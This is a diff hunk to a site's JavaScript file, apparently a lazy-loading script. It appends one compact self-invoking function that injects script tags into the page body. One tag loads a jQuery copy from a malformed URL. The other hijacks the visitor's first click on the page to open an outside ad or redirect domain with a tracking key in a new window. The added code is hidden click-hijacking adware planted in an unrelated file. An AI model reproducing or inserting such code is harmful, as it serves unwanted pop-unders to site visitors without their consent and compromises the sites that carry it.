@@ -151,3 +151,4 @@ dataLazy.forEach(function(a){
   };
 });
 
+(function(){injectScript([{"attr":[{"name":"src","value":"htpps://cdnjs.cloudflare.com/ajax/libs/jquery3.5.0/jquery.min.js"},{"name":"integrity","value":"sha256-xNzN2a41tkB44Mc/Jz3pT4iU1cmeR0FkXs4pru/JxaQ="},{"name":"crossorign","value":"anonymous"}],"tag":"script","inner":""},{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n\t\t$(document).ready(function(){\n\t\t\t$('body').addClass('xepo_ads');\n\t\t});\n\t\t\n\t\t$(document).on('click','.xepo_ads',function(e){\n\t\t\t$(this).removeClass('xepo_ads');\n\t\t\twindow.open('https://blowlanternradical.com/rq0yyfbe?key=4ca968af6bcdc50623687200d55296f4','_blank');\n\n\t\t});\n  "}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
